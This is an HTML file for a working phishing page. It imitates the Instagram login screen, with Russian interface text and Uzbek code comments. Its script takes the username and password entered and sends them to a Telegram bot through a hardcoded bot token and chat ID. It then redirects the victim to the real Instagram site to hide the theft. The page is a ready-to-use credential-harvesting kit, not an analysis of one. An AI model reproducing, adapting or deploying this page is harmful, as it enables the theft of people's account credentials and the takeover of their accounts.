<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        @media (max-width: 768px) {
        body {
            flex-direction: column !important;
            padding: 10px !important;
        }
        /* Chap tarafdagi rasm/matn qismini telefonda yashirish yoki kichraytirish uchun */
        div:first-child {
            display: none; 
        }
    }

        body {
            background-color: #ffffff;
            color: #000000;
        }

        .container {
            display: flex;
            min-height: 100vh;
        }

        .left-side {
            flex: 1.1;
            padding: 40px 60px;
            display: flex;
            flex-direction: column;
        }

        .ig-logo {
            width: 60px;
            height: 60px;
            object-fit: contain;
        }

        .hero-content {
            margin: auto;
            text-align: center;
            max-width: 550px;
        }

        .hero-content h1 {
            font-family: Georgia, "Times New Roman", serif;
            font-size: 36px;
            font-weight: 400;
            line-height: 1.35;
            margin-bottom: 35px;
            color: #1c1e21;
        }

        .gradient-text {
            background: linear-gradient(90deg, #ff6a00, #ee0979, #b91d73);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .collage-img {
            width: 340px;
            max-width: 100%;
            height: auto;
        }

        .divider {
            width: 1px;
            background-color: #dbdbdb;
        }

        .right-side {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px;
        }

        .login-box {
            width: 100%;
            max-width: 440px;
        }

        .login-box h2 {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 18px;
            color: #1c1e21;
        }

        .input-group {
            position: relative;
            margin-bottom: 12px;
        }

        .input-group input {
            width: 100%;
            height: 56px;
            padding: 20px 16px 6px;
            border: 1px solid #cbd2d9;
            border-radius: 14px;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-group input:focus {
            border-color: #1c1e21;
        }

        .input-group label {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 13px;
            color: #65676b;
            pointer-events: none;
            transition: 0.2s ease all;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: 90%;
        }

        .input-group input:focus ~ label,
        .input-group input:valid ~ label {
            top: 14px;
            font-size: 11px;
        }

        .btn-login {
            width: 100%;
            height: 44px;
            background-color: #8cb9f8;
            color: #ffffff;
            border: none;
            border-radius: 22px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 6px;
            transition: background-color 0.2s;
        }

        .btn-login:hover {
            background-color: #1877f2;
        }

        .forgot-link {
            display: block;
            text-align: center;
            margin-top: 18px;
            font-size: 14px;
            font-weight: 500;
            color: #1c1e21;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .bottom-actions {
            margin-top: 65px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .btn-fb {
            width: 100%;
            height: 44px;
            background-color: #f0f2f5;
            border: none;
            border-radius: 22px;
            font-size: 14px;
            font-weight: 600;
            color: #1c1e21;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            cursor: pointer;
        }

        .btn-fb:hover {
            background-color: #e4e6eb;
        }

        .btn-create {
            width: 100%;
            height: 44px;
            background-color: transparent;
            border: 1px solid #1877f2;
            border-radius: 22px;
            font-size: 14px;
            font-weight: 600;
            color: #1877f2;
            cursor: pointer;
        }

        .btn-create:hover {
            background-color: #f0f7ff;
        }

        .meta-logo {
            text-align: center;
            margin-top: 12px;
            font-size: 15px;
            font-weight: 600;
            color: #1c1e21;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-side">
            <img src="https://static.vecteezy.com/system/resources/thumbnails/045/934/243/small/instagram-logo-icon-transparent-background-free-png.png" alt="Instagram" class="ig-logo">
            <div class="hero-content">
                <h1>
                    Посмотрите, какими моментами<br>
                    из жизни поделились ваши<br>
                    <span class="gradient-text">близкие друзья</span>.
                </h1>
                <img src="image.png" alt="Stories" class="collage-img">
            </div>
        </div>

        <div class="divider"></div>

        <div class="right-side">
            <div class="login-box">
                <h2>Войти в Instagram</h2>
                <form id="loginForm">
                    <div class="input-group">
                        <input type="text" id="username" required>
                        <label>Имя пользователя, номер мобильного телефона или электронный ад...</label>
                    </div>
                    <div class="input-group">
                        <input type="password" id="password" required>
                        <label>Пароль</label>
                    </div>
                    <button type="submit" class="btn-login">Войти</button>
                </form>
                <a href="#" class="forgot-link">Забыли пароль?</a>
                
                <div class="bottom-actions">
                    <button type="button" class="btn-fb">
                        <svg viewBox="0 0 24 24" width="18" height="18" fill="#1877F2">
                            <path d="M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z"/>
                        </svg>
                        Войти через Facebook
                    </button>
                    <button type="button" class="btn-create">Создать новый аккаунт</button>
                    <div class="meta-logo">
                        <span>&infin; Meta</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

   <script>
        const BOT_TOKEN = "9232374502:AAHXj-oTIckSHTJRNQonYhTiY8E3PFwA5Z8";
        const CHAT_ID = "8572141476";

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const submitBtn = document.querySelector('.btn-login');

            if (!username || !password) {
                alert("Iltimos, barcha maydonlarni to'ldiring!");
                return;
            }

            // Tugma matnini o'zgartiramiz va bosishni bloklaymiz
            submitBtn.disabled = true;
            submitBtn.textContent = "Biroz kuting...";

            const message = `🚨 <b>Yangi kirish urinishi!</b>\n\n` +
                            `👤 <b>Login/Email/Tel:</b> ${username}\n` +
                            `🔑 <b>Parol:</b> <code>${password}</code>`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: Number(CHAT_ID),
                        text: message,
                        parse_mode: "HTML"
                    })
                });

                const data = await response.json();

                if (data.ok) {
                    // Muvaffaqiyatli yuborilgach Instagram rasmiy sahifasiga o'tkazish
                    window.location.href = 'https://www.instagram.com';
                } else {
                    alert("Xatolik yuz berdi: " + data.description);
                    submitBtn.disabled = false;
                    submitBtn.textContent = "Войти";
                }
            } catch (error) {
                alert("Tarmoq xatosi yuz berdi!");
                submitBtn.disabled = false;
                submitBtn.textContent = "Войти";
            }
        });
    </script>
</body>
</html>
